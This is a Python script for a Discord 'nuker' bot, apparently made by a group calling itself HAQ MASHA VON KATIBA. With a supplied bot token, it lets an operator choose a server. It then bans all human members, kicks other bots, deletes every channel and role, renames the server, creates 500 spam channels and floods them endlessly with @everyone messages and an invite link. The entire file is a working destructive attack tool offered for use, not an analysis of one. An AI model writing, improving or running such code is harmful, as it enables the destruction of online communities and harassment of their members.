import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random
import time
import aiohttp

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                               ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗███████╗              ║
║                    ██║   ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝              ║
║                    ██║   ██║██║   ██║██╔██╗ ██║██║     █████╗                ║
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║     ██╔══╝                ║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║╚██████╗███████╗              ║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝              ║
║                                                                               ║
║                    ╔═══════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA SILENT NUKER v4.0           ║  ║
║                    ║          NO MESSAGES - FULL DESTRUCTION              ║  ║
║                    ╚═══════════════════════════════════════════════════════╝  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# ============================================
# COLORS
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# NUKE FUNCTION (SILENT - NO MESSAGES)
# ============================================
async def silent_nuke(guild):
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] SILENT NUKE STARTED ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    
    start_time = time.time()
    
    # ============================================
    # PHASE 1: GET ALL MEMBERS
    # ============================================
    print(f"{Colors.CYAN}[1/6] FETCHING MEMBERS...{Colors.RESET}")
    members = await guild.fetch_members(limit=None).flatten()
    total_members = len([m for m in members if not m.bot])
    print(f"{Colors.GREEN}    ✓ {total_members} TARGETS FOUND{Colors.RESET}")
    
    # ============================================
    # PHASE 2: BAN ALL MEMBERS (SILENT - NO DMS)
    # ============================================
    print(f"{Colors.CYAN}[2/6] BANNING ALL MEMBERS...{Colors.RESET}")
    banned = 0
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason="HAQ MASHA VON KATIBA", delete_message_days=7)
                banned += 1
                if banned % 20 == 0:
                    print(f"    • BANNED {banned}/{total_members}")
                await asyncio.sleep(0.03)
            except:
                pass
    print(f"{Colors.GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
    
    # ============================================
    # PHASE 3: REMOVE ALL BOTS
    # ============================================
    print(f"{Colors.CYAN}[3/6] REMOVING ALL BOTS...{Colors.RESET}")
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason="HAQ MASHA")
                bots_kicked += 1
                await asyncio.sleep(0.02)
            except:
                pass
    print(f"{Colors.GREEN}    ✓ REMOVED {bots_kicked} BOTS{Colors.RESET}")
    
    # ============================================
    # PHASE 4: DELETE ALL CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[4/6] DELETING ALL CHANNELS...{Colors.RESET}")
    channels_deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="HAQ MASHA")
            channels_deleted += 1
            if channels_deleted % 50 == 0:
                print(f"    • DELETED {channels_deleted} CHANNELS")
            await asyncio.sleep(0.02)
        except:
            pass
    print(f"{Colors.GREEN}    ✓ DELETED {channels_deleted} CHANNELS{Colors.RESET}")
    
    # ============================================
    # PHASE 5: DELETE ALL ROLES
    # ============================================
    print(f"{Colors.CYAN}[5/6] DELETING ALL ROLES...{Colors.RESET}")
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="HAQ MASHA")
                roles_deleted += 1
                await asyncio.sleep(0.02)
            except:
                pass
    print(f"{Colors.GREEN}    ✓ DELETED {roles_deleted} ROLES{Colors.RESET}")
    
    # ============================================
    # PHASE 6: RENAME SERVER & CREATE SPAM CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[6/6] RENAMING SERVER & CREATING SPAM CHANNELS...{Colors.RESET}")
    
    # Change server name
    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED", "NUKE", "VON-HAQ"])
    try:
        await guild.edit(name=new_name)
        print(f"    ✓ RENAMED TO: {new_name}")
    except:
        pass
    
    # Create 500 spam channels
    spam_list = [
        "VON-KATIBA",
        "HAQ-MASHA",
        "DESTROYED",
        "NUKE",
        "GET-REKT",
        "BYE-BYE"
    ]
    
    for i in range(500):
        try:
            await guild.create_text_channel(name=f"{random.choice(spam_list)}-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} CHANNELS")
            await asyncio.sleep(0.01)
        except:
            pass
    
    # Start infinite spam in new channels
    async def spam():
        spam_messages = [
            "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
            "@everyone **HAQ MASHA TEAM DESTROYED THIS SERVER**",
            "```SERVER DESTROYED BY HAQ MASHA```",
            "**VON KATIBA WAS HERE**",
            "@everyone **https://discord.gg/c7cgYk4V**"
        ]
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(spam_messages))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(spam())
    print(f"{Colors.GREEN}    ✓ CREATED 500 CHANNELS + SPAM STARTED{Colors.RESET}")
    
    # ============================================
    # FINISH
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓] SILENT NUKE COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • SERVER: {guild.name}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
    print(f"{Colors.GREEN}    • BOTS REMOVED: {bots_kicked}")
    print(f"{Colors.GREEN}    • CHANNELS DELETED: {channels_deleted}")
    print(f"{Colors.GREEN}    • ROLES DELETED: {roles_deleted}")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")

# ============================================
# SHOW SERVERS FUNCTION
# ============================================
def show_servers():
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 20}📋 AVAILABLE SERVERS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}\n")
    
    for i, guild in enumerate(bot.guilds, 1):
        members = len(guild.members)
        channels = len(guild.channels)
        voice = len(guild.voice_channels)
        
        print(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
        print(f"     ├─ 🆔 ID: {guild.id}")
        print(f"     ├─ 👥 Members: {members}")
        print(f"     ├─ 💬 Channels: {channels}")
        print(f"     └─ 🎧 Voice: {voice}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")

# ============================================
# MAIN SELECTION MENU (CONSOLE)
# ============================================
async def select_server():
    while True:
        print(f"\n{Colors.BOLD}{Colors.YELLOW}🎯 SILENT NUKE - SELECT TARGET{Colors.RESET}")
        show_servers()
        
        try:
            choice = input(f"\n{Colors.CYAN}📌 SELECT SERVER NUMBER (or 'q' to quit): {Colors.RESET}")
            
            if choice.lower() == 'q':
                print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
                return None
            
            server_num = int(choice)
            if 1 <= server_num <= len(bot.guilds):
                selected = bot.guilds[server_num - 1]
                
                print(f"\n{Colors.RED}{Colors.BOLD}⚠️  SILENT NUKE ON: {selected.name}{Colors.RESET}")
                confirm = input(f"{Colors.YELLOW}TYPE 'yes' TO CONFIRM: {Colors.RESET}")
                
                if confirm.lower() == 'yes':
                    return selected
                else:
                    print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}❌ ENTER A VALID NUMBER!{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
            return None

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀 SILENT NUKE MODE ACTIVATED                                     ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 NO MESSAGES WILL BE SENT                                       ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💀 JUST PURE DESTRUCTION                                         ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    await asyncio.sleep(1)
    
    # Start server selection
    target_server = await select_server()
    
    if target_server:
        print(f"\n{Colors.RED}{Colors.BOLD}🔥 STARTING SILENT NUKE IN 3 SECONDS...{Colors.RESET}")
        for i in range(3, 0, -1):
            print(f"   {i}...")
            await asyncio.sleep(1)
        
        await silent_nuke(target_server)
        print(f"\n{Colors.GREEN}{Colors.BOLD}✅ NUKE COMPLETED!{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}❌ NO SERVER SELECTED!{Colors.RESET}")
    
    await bot.close()

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
